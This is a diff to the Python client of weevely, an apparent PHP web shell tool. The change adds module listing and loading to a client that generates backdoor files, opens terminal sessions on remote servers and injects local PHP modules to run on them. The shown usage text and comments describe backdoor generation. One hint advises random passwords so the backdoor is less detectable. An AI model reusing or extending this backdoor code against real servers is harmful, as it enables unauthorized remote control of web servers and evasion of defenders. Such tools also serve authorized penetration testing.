@@ -2,15 +2,19 @@
 # -*- coding: utf-8 -*-
 
 from numpy import frombuffer, bitwise_xor, byte
-import getopt, sys, base64, os, urllib2, re, urlparse
+import getopt, sys, base64, os, urllib2, re, urlparse, os
     
 class weevely:
+  
+  modules = {}
+  
   def main(self):
     
     self.banner()
+    self.loadmodules()
   
     try:
-	opts, args = getopt.getopt(sys.argv[1:], 'tgm:c:u:p:o:', ['module', 'generate', 'url', 'password', 'terminal', 'command', 'output'])
+	opts, args = getopt.getopt(sys.argv[1:], 'ltgm:c:u:p:o:', ['list', 'module', 'generate', 'url', 'password', 'terminal', 'command', 'output'])
     except getopt.error, msg:
 	print "Error:", msg
 	exit(2)
@@ -20,11 +24,13 @@ class weevely:
 	  moderun='g'
 	if o in ("-t", "-terminal"):
 	  moderun='t'
+	if o in ("-l", "-list"):
+	  moderun='l'
 	if o in ("-c", "-command"):
 	  cmnd=a
 	  moderun='c'
 	if o in ("-m", "-module"):
-	  module=a
+	  modul=a
 	  moderun='m'
 	  
 	if o in ("-u", "-url"):
@@ -53,7 +59,7 @@ class weevely:
 	  print "! Please specify where generate backdoor file (-o)"
 	  sys.exit(1)
 
-      if 'pwd' not in locals():
+      if 'pwd' not in locals() and moderun!='l':
 	if moderun=='g':
 	  print "+ Be careful: password is transmitted unencrypted as a fake url parameter.\n+ Random alphanumeric password (like 'a33k44') are less detectable."
 	  
@@ -74,7 +80,9 @@ class weevely:
       if moderun=='g':
 	self.generate(pwd,outfile)
       if moderun=='m':
-	self.execmodule(url,pwd,module)
+	self.execmodule(url,pwd,modul)
+      if moderun=='l':
+	self.listmodules()
     else:
       self.usage()
       sys.exit(1)
@@ -89,7 +97,10 @@ class weevely:
 +  Terminal session
 +  	./weevely -t -u <url> -p <password>
 +
-+  Module execution
++  List available modules
++  	./weevely -l
++
++  Execute local PHP on remote server, with arguments.
 +  	./weevely -m <module>:<firstarg>:..:<secondarg> -u <url> -p <password>"""
     
   def banner(self):
@@ -115,7 +126,6 @@ class weevely:
     try: 
       ret=self.execHTTPGet(refurl,url)
     except urllib2.URLError, e:
-      #return str(e)
       raise
     else: 
       restring='<' + pwd + '>(.*)</' + pwd + '>'
@@ -167,24 +177,85 @@ class weevely:
      
   def execmodule(self, url, pwd, modulestring):
     
-    modname = modulestring.split(':')[0]
-    modargs = modulestring.split(':')[1:]
-    #print modname, modargs
+    modname = modulestring.split('::')[0]
+    modargs = modulestring.split('::')[1:]
     
-    f = file('modules/' + modname + '.php')
-    modargsstring=str(modargs)
-    toinject = '$ar=Array(' + modargsstring[1:len(modargsstring)-1] + ');'
-    toinject = toinject + f.read()
-    
-    try:
-      ret = self.execute(url, pwd, toinject, 1)
-    except Exception, e:
-      print '! Backdoor verification failed: ' + str(e) + '.'
-      return
+    if not self.modules.has_key(modname):
+      print '! Module', modname, 'doesn\'t exist. Print list (-l).'
     else:
-      print ret
+      m = self.modules[modname]
+      if m.has_key('arguments'):
+	argnum=len(self.modules[modname]['arguments'])
+	if len(modargs)!=argnum:
+	  print '! Module', modname, 'takes exactly', argnum, 'arguments.'
+	  return
+	  
+      f = file('modules/' + modname + '.php')
+      modargsstring=str(modargs)
+      toinject = '$ar=Array(' + modargsstring[1:len(modargsstring)-1] + ');'
+      toinject = toinject + f.read()
+      
+      try:
+	ret = self.execute(url, pwd, toinject, 1)
+      except Exception, e:
+	print '! Module execution failed: ' + str(e) + '.'
+	return
+      else:
+	print ret
+    
    
+  def listmodules(self):
+    
+    for n in self.modules.keys():
+      m = self.modules[n]
+      
+      print '+ Module:', m['name'],
+      if m.has_key('author'):
+	print m['author']
+      else:
+	print ''
+      
+      if m.has_key('description'):
+	print '  Description:', m['description']
+      if m.has_key('arguments'):
+	print '  Take', str(len(m['arguments'])), 'argument/s:', ','.join(m['arguments']) + '.'
   
+  def loadmodules(self):
+    files = os.listdir('modules')
+    
+    for f in files:
+      module={}
+      
+      if f.endswith('.php'):
+	
+	  
+	mod = file('modules/' + f)
+	modstr = mod.read()
+	modname = f[:-4]
+	module['name']=modname
+	
+	restring='//.*Author:(.*)'
+	e = re.compile(restring)
+	founded=e.findall(modstr)
+	if founded:
+	  module['author']=founded[0]
+
+	restring='//.*Description:(.*)'
+	e = re.compile(restring)
+	founded=e.findall(modstr)
+	if founded:
+	  module['description']=founded[0]
+	  
+	restring='//.*Arguments:(.*)'
+	e = re.compile(restring)
+	founded=e.findall(modstr)
+	if founded:
+	  module['arguments']=founded[0].split(',')
+
+	self.modules[module['name']]=module
+     
+  
+    
 if __name__ == "__main__":
     
     
